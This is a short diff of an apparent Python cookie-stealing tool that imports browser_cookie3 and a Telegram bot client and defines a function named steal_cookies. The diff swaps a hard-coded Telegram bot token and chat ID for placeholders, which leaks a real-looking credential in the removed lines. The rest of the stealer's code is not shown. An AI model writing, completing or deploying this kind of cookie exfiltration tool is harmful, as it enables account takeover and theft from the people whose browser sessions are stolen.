@@ -2,10 +2,10 @@ import browser_cookie3
 from telegram import Bot
 import asyncio
 
-# Токен бота
-TOKEN = "6422380390:AAG0WAUbA2P6x_vWVcA4-Hf-YwDBwGPInwI"
-# Твой chat_id
-YOUR_CHAT_ID = "1179998122"  # Замени на свой chat_id
+
+TOKEN = "ur token"
+
+YOUR_CHAT_ID = "ur id" 
 
 # Функция для извлечения куки из браузеров с указанием сайтов
 def steal_cookies():
